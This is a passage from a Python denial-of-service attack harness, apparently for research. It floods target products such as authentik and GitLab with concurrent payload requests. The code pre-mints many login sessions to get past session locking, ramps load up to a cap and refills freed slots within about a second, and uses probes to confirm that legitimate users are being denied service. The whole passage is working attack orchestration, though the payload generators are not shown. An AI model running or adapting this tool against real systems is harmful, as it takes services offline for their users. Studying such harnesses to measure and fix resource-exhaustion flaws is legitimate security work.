        use = samples[1:] if len(samples) > 1 else samples      # drop warmup
        served = [pt for pt, pc in use
                  if isinstance(pt, float) and not (isinstance(pc, int) and is_fail(pc))]
        reasons = {}
        for pt, pc in use:
            if isinstance(pt, float) and not (isinstance(pc, int) and is_fail(pc)):
                continue
            r = (err_label(pc) if not isinstance(pt, float) else f"HTTP {pc}") if pc is not None else "err"
            r = r if isinstance(pc, int) else str(pc)
            reasons[r] = reasons.get(r, 0) + 1
        def _stat(xs):
            if not xs:
                return dict(n=0, median=None, mean=None, stdev=None, min=None, max=None)
            return dict(n=len(xs), median=round(_st.median(xs), 4), mean=round(_st.mean(xs), 4),
                        stdev=round(_st.stdev(xs), 4) if len(xs) > 1 else 0.0,
                        min=round(min(xs), 4), max=round(max(xs), 4))
        probe_sz = t.get("probe_size", 1) if heavy else 1
        probe_vec = t.get("probe_vector", a.vector or t["vector"]) if heavy else "minimal"
        out = dict(target=a.target, mode="calibrate", probe_vector=probe_vec, probe_size=probe_sz,
                   body_bytes=len(pbody.encode()), samples=len(use), served=_stat(served),
                   served_latencies=[round(x, 4) for x in served],
                   failed_n=len(use) - len(served), failed_reasons=reasons)
        sv = out["served"]
        print(f"# calibrate {a.target}: probe={probe_vec}@{probe_sz}  served {sv['n']}/{len(use)}  "
              f"median={sv['median']}s stdev={sv['stdev']}s  failed={out['failed_n']}", flush=True)
        if a.json:
            write_json(a.json, out)
        return 0

    if a.probe_only:
        # Idle control: fire nothing; just measure a legit request on the SAME endpoint for N
        # seconds. Baseline latency/availability with no attack -- the reviewer control that shows
        # the denial recorded by an attack run is caused by the attack, not the endpoint itself.
        # Use the work-doing probe here too when --probe-size is set, so the idle control measures
        # the SAME probe the attack will use -> its served latency calibrates the shed floor.
        heavy_idle = bool(t.get("probe_size"))
        pbody = gen_probe_body(t, a.vector or t["vector"], req_id, heavy=heavy_idle)
        if not pbody:
            sys.exit("probe payload generation failed")
        if heavy_idle:
            print(f"# idle uses work-doing probe ({t.get('probe_vector', a.vector or t['vector'])} "
                  f"@{t['probe_size']}) to calibrate served latency", flush=True)
        is_fail = fail_predicate(t)
        pstats = ProbeStats(0.0)
        stop_event = threading.Event()
        phase_state = ["sustain"]
        pth = threading.Thread(target=probe_loop,
                               args=(t, pbody, cookies, headers, pstats, phase_state,
                                     is_fail, stop_event), daemon=True)
        print(f"# idle control: probing {a.target} for {a.probe_only:g}s with NO attack...", flush=True)
        pth.start()
        time.sleep(a.probe_only)
        stop_event.set(); pth.join(timeout=5)
        idle_stats = Stats()
        print_summary(idle_stats, pstats)
        if a.json:
            write_json(a.json, build_json(a.target, a.vector or t["vector"], 0, None,
                       a.probe_only, "idle", idle_stats, pstats, None))
        return 0
    body, info = gen_body(t, a, req_id)
    if not body:
        sys.exit(f"payload generation failed:\n{info}")
    nbytes = len(body.encode())
    print(f"# target={a.target} {info.splitlines()[0] if info else ''}  body={len(body)/1024:.1f}KB")
    if a.dry_run:
        return 0

    # A lightweight benign request of the same type/endpoint for the liveness probe.
    # The heavy work-doing probe is a fallback for saturation detection: use it ONLY when we are
    # generating concurrent load (multi-worker / sustained) AND the target has no other saturation
    # signal (it declares a `probe_size` because its served status is constant, e.g. authentik).
    # Every other case -- single-shot probes, and any target that signals a downed backend via a
    # status code -- keeps the minimal size-1 probe, so we don't add needless load or latency.
    saturating = bool(a.max_inflight or a.interval or (a.workers or 1) > 1)
    use_work_probe = saturating and bool(t.get("probe_size"))   # t["probe_size"] may come from --probe-size
    probe_body = ""
    if a.probe or a.interval:
        probe_body = gen_probe_body(t, a.vector or t["vector"], req_id, heavy=use_work_probe)
        if not probe_body:
            print("# warning: probe payload generation failed; probing disabled")
        elif use_work_probe:
            print(f"# saturation probe: work-doing ({t['probe_vector'] if t.get('probe_vector') else t['vector']} "
                  f"@{t['probe_size']}, floor {t.get('probe_floor', 0):g}s) -- served vs shed by latency, "
                  f"since this target's status is constant", flush=True)
    is_fail = fail_predicate(t)   # product-specific probe backend-failure statuses (e.g. GitLab 502)
    # A flood request LANDED (burned server CPU) iff it took real work AND wasn't a backend-fail
    # status/conn-error. Crucial for products whose status code is CONSTANT regardless of work --
    # e.g. authentik returns 405 both for a canonicalized 40s Response AND for one instantly
    # rejected by Django's DATA_UPLOAD_MAX_MEMORY_SIZE (2.5MiB) gate. Latency is the only signal.
    def is_bfail(c): return (isinstance(c, int) and is_fail(c)) or isinstance(c, str)
    work_s = t.get("work_s", WORK_S)   # per-target landing floor: for products whose genuine sink
    # runs for tens of seconds (authentik: 40s+), a 1s floor would miscount a queued-then-rejected
    # request as landed. Set it near the observed single-request time to separate slot from shed.
    def landed(d, c): return d >= work_s and not is_bfail(c)
    # probe_floor only applies to the heavy work-doing probe -- a size-1 minimal probe legitimately
    # returns in <floor, so the floor must be OFF for it (else every minimal probe reads "bounced").
    probe_floor = t.get("probe_floor", 0.0) if use_work_probe else 0.0

    stats = Stats()

    def wave():
        results = [None] * a.workers
        def one(i): results[i] = send_once(t, body, cookies, headers, nbytes, stats)
        ths = [threading.Thread(target=one, args=(i,)) for i in range(a.workers)]
        for th in ths: th.start()
        for th in ths: th.join()
        dts = [r[0] for r in results]; codes = [r[1] for r in results]
        print(f"  fired {a.workers}: median={sorted(dts)[len(dts)//2]:.2f}s "
              f"max={max(dts):.2f}s codes={ {c: codes.count(c) for c in set(codes)} }", flush=True)
        if a.probe and not a.interval and probe_body:   # continuous mode probes once/sec in its own thread
            pt, pc = probe(t, probe_body, cookies, headers)
            failed = (pt is None or (isinstance(pt, float) and pt > 10)
                      or (isinstance(pc, int) and is_fail(pc))
                      or (probe_floor and isinstance(pt, float) and pt < probe_floor))
            why = ("" if not failed else
                   " bounced" if (probe_floor and isinstance(pt, float) and pt < probe_floor
                                  and not (isinstance(pc, int) and is_fail(pc))) else
                   " slow" if (isinstance(pt, float) and pt > 10) else " backend")
            print(f"  probe: {'DENIED' + why if failed else 'ok'} "
                  f"({pt if pt is None else round(pt,2)}s HTTP {pc})", flush=True)

    if a.interval or a.max_inflight:
        interval = a.interval if a.interval else 5.0
        cap = a.max_inflight

        # Per-session-cookie targets serialize on the PHP session lock if every request reuses one
        # cookie. Pre-mint a pool of independent sessions so concurrent requests each get their own.
        session_pool = None
        if t.get("login") and not a.no_login:
            n = a.sessions or cap or a.workers
            print(f"# minting {n} independent SP sessions for parallel load "
                  f"(avoids session-lock serialization)...", flush=True)
            session_pool, got = build_session_pool(t, a, n)
            if got < n:
                print(f"# warning: only {got}/{n} sessions minted (login endpoint flaky/saturated?)",
                      flush=True)
            if got == 0:
                sys.exit("no sessions minted; is the target up and the login endpoint reachable?")

        pstats = ProbeStats(probe_floor)
        stop_event = threading.Event()
        recovered_event = threading.Event()             # set by probe at first served recovery probe
        phase_state = ["ramp" if cap else "sustain"]   # main thread advances this; probe reads it
        backend_down = [False]                          # set by probe: backend not serving (fail status/error)
        probe_shed = [False]                            # set by probe: legit request bounced (over capacity)
        pth = None
        if probe_body:
            pth = threading.Thread(target=probe_loop,
                                   args=(t, probe_body, cookies, headers, pstats, phase_state,
                                         is_fail, stop_event, backend_down, probe_shed),
                                   kwargs=dict(recovered_event=recovered_event),
                                   daemon=True)
            pth.start()

        # Non-blocking waves: fire a batch every `interval`, WITHOUT waiting for prior waves to
        # finish. Each request runs to completion in its own thread (connection stays open) and
        # records its result; we join them all during the drain at the end.
        lock = threading.Lock()
        results, threads, inflight = [], [], [0]
        saturated = [False]
        def fire_one():
            if session_pool is not None:
                c, b, nb = session_pool.get()          # check out a distinct session (blocks if none)
                try:
                    r = send_once(t, b, c, headers, nb, stats)
                finally:
                    session_pool.put((c, b, nb))        # return it for reuse (never held concurrently)
            else:
                r = send_once(t, body, cookies, headers, nbytes, stats)
            with lock:
                results.append(r); inflight[0] -= 1

        def next_wave(infl, done):
            """Return (batch_size, phase_label) for the current in-flight / completed counts."""
            if not cap:
                return a.workers, "fixed"
            headroom = cap - infl
            if headroom <= 0:
                return 0, "hold"          # already at/over the target
            if saturated[0]:
                return headroom, "hold"   # top up exactly what drained
            floor = max(1, cap // 10)
            # Leave the ramp once we're within a floor-step of the target, OR once requests have
            # started completing (the gentle-onset phase is over) -- then hold at cap via full top-up.
            if headroom <= floor or done > 0:
                saturated[0] = True
                return headroom, "hold"
            return min(headroom, max(floor, (headroom + 2) // 3)), "ramp"  # declining ~1/3 steps

        start_t = time.time()
        end = start_t + a.duration if a.duration else float("inf")
        wave_no = 0                              # = floor(elapsed / interval): every interval is a wave,
                                                 # whether we FIRE into it or HOLD through it, so the
                                                 # numbering tracks the clock and bouncing can't desync it.
        prev_done = 0                            # results index consumed by the previous look
        shedding = False                         # regime, for onset/offset edge detection
        # Poll FAST when probe-gating so a freed slot is refilled within ~1s (else the pool sits
        # under-saturated for a whole wave and stray probes succeed, understating the denial). The
        # WAVE cadence stays `interval` regardless -- poll is only how often we re-check for a refill.
        poll = min(interval, 1.0) if use_work_probe else interval
        try:
            while time.time() < end:
                now = time.time()
                with lock:
                    infl_now, done = inflight[0], len(results)
                    snap = results[:]           # completed (dt, code) so far
                land = sum(1 for d, c in snap if landed(d, c))
                shed = done - land              # cumulative: returned but did no real work
                cmed = sorted(d for d, _ in snap)[done // 2] if done else 0.0
                new = snap[prev_done:]; prev_done = done   # WINDOWED completions since last look
                dland = sum(1 for d, c in new if landed(d, c))
                dshed = len(new) - dland
                wmed = sorted(d for d, _ in new)[len(new) // 2] if new else cmed
                edge = ""
                if not shedding and dshed >= max(2, (cap or a.workers) // 20) and dshed > dland:
                    shedding = True;  edge = "  <== SHED ONSET (past capacity; excess is bounced)"
                elif shedding and len(new) > 0 and dshed == 0:
                    shedding = False; edge = "  <== shedding stopped (back within capacity)"

                cur_wave = int((now - start_t) / interval) + 1   # which interval we're in
                tick = cur_wave > wave_no                        # crossed into a new wave this poll
                if tick:
                    wave_no = cur_wave

                if pth and backend_down[0]:     # backend not serving (error/fail status): don't spawn
                    if tick or edge:
                        print(f"  wave {wave_no} [backend down ->{cap}]  in-flight~{infl_now}  "
                              f"completed={done}{edge}", flush=True)
                    time.sleep(poll); continue

                bouncing = bool(pth and probe_shed[0])
                if bouncing:                    # past capacity: HOLD, fire nothing. The in-flight
                    # grinders keep the server pinned; the fast poll means we refill within ~1s of a
                    # slot freeing. Print once per WAVE (tick) or on an edge -- not every poll.
                    phase_state[0] = "sustain"
                    if tick or edge:
                        print(f"  wave {wave_no} [hold: probe bouncing ->{cap}]  in-flight~{infl_now}  "
                              f"completed={done} (landed>={work_s:g}s:{land} shed:{shed}){edge}",
                              flush=True)
                    time.sleep(poll); continue

                # Not bouncing: (re)fill to cap. next_wave returns FULL headroom once saturated, so a
                # resume slams straight back to capacity -- no dampening, re-saturate hard and fast.
                size, phase = next_wave(infl_now, done)
                phase_state[0] = "ramp" if phase == "ramp" else "sustain"
                if size:
                    batch = [threading.Thread(target=fire_one, daemon=True) for _ in range(size)]
                    with lock:
                        inflight[0] += size; infl = inflight[0]
                    for th in batch:
                        th.start(); threads.append(th)
                else:
                    infl = infl_now
                if tick or size or edge:        # print on a wave boundary, a refill, or an edge
                    tag = f"[{phase} ->{cap}]" if cap else f"[{phase}]"
                    grind = " grinding" if (done == 0 and infl > 0) else ""
                    wtail = f"  wmed={wmed:.1f}s" if len(new) else ""
                    note = "  (refilled: slot freed)" if (size and not tick) else ""
                    print(f"  wave {wave_no} {tag}: +{size} fired  in-flight~{infl}{grind}  "
                          f"completed={done} (landed>={work_s:g}s:{land} shed:{shed})"
                          f"{wtail}{note}{edge}", flush=True)
                time.sleep(poll)
        except KeyboardInterrupt:
            print("# stopped firing")
        phase_state[0] = "recovery"   # stopped feeding; probe now measures recovery as floods drain
        recovery_start = time.perf_counter()
        print(f"# {wave_no} waves elapsed ({len(threads)} requests fired; holds count as waves but "
              f"fire nothing); draining in-flight (~{inflight[0]}) -- probe keeps running to show "
              f"recovery...", flush=True)
        for th in threads:
            th.join()
        # End the recovery phase once the probe thread sees TWO consecutive legit requests
        # served in <10s (recovered_event). --recovery-timeout caps how long to wait for that
        # (0 = wait indefinitely). Needs a probe to observe service -- without one, just drain
        # and stop (the pre-existing behaviour).
        if pth:
            deadline = recovery_start + a.recovery_timeout if a.recovery_timeout > 0 else None
            try:
                while not stop_event.is_set() and not recovered_event.is_set():
                    if deadline is not None and time.perf_counter() >= deadline:
                        break
                    wait = 1.0 if deadline is None else min(1.0, max(0.05, deadline - time.perf_counter()))
                    recovered_event.wait(wait)
            except KeyboardInterrupt:
                print("# recovery hold interrupted")
            held = time.perf_counter() - recovery_start
            msg = ("service recovered (2 consecutive probes <10s)" if recovered_event.is_set()
                   else f"recovery NOT confirmed within the {a.recovery_timeout:g}s cap")
            print(f"# recovery ended after {held:.1f}s -- {msg}", flush=True)
        stop_event.set()
        if pth: pth.join(timeout=5)
        dts = [r[0] for r in results]; codes = [r[1] for r in results]
        if dts:
            # Two lenses. backend-fail = the server was distressed for this request (a product
            # fail_status like GitLab's 502/500, or a connection error). effective = a CLEAN landing:
            # took real work (latency >= WORK_S) AND got a normal response -- NOT a slow 502, which
            # trips the latency cut but did no server work (nginx just waited on a restarting worker).
            # A request that burned then got killed is indistinguishable from a bounce client-side, so
            # it falls under backend-fail; measure induced work server-side (docker stats / oom_kill).
            eff = sum(1 for d, c in zip(dts, codes) if landed(d, c))
            bfail = sum(1 for c in codes if is_bfail(c))
            print(f"# requests: {len(dts)} completed  median={sorted(dts)[len(dts)//2]:.2f}s  "
                  f"max={max(dts):.2f}s  effective(>={work_s:g}s)={eff}  backend-fail={bfail}  "
                  f"codes={ {c: codes.count(c) for c in set(codes)} }")
            # INERT guard: 0 requests did real work, none hit a backend-fail status, and (if
            # probed) the liveness probe never failed -> the flood did NOTHING and the server was
            # never distressed. The flood-side "shed" counter looks identical here (all fast
            # completions), so without this line an inert vector/target mismatch reads like a
            # working attack. This is NOT overload-shedding; the payload is not reaching a sink
            # (wrong vector for this product, or --size too small).
            probe_fails = sum(pstats.failed[ph] for ph in ProbeStats.PHASES) if pth else None
            inert = (eff == 0 and bfail == 0 and probe_fails in (0, None))
            if inert:
                print(f"# WARNING: attack looks INERT -- 0/{len(dts)} requests did >={work_s:g}s "
                      f"work, none backend-failed"
                      + (", probe served the whole run" if pth else "")
                      + f". '{a.vector or t['vector']}' likely doesn't reach a sink on "
                      f"{a.target} (vector/target mismatch), or --size is too small.", flush=True)
        print_summary(stats, pstats if pth else None)
        if a.json:
            req = None
            if dts:
                req = dict(completed=len(dts), effective=eff, backend_fail=bfail, inert=inert,
                           median_s=round(sorted(dts)[len(dts) // 2], 3), max_s=round(max(dts), 3))
            write_json(a.json, build_json(a.target, a.vector or t["vector"], nbytes,
                       a.max_inflight, a.duration, "attack", stats,
                       pstats if pth else None, req))
    else:
        wave()
        print_summary(stats)
        if a.json:
            write_json(a.json, build_json(a.target, a.vector or t["vector"], nbytes,
                       None, None, "attack", stats, None, None))
    return 0


if __name__ == "__main__":
    sys.exit(main())
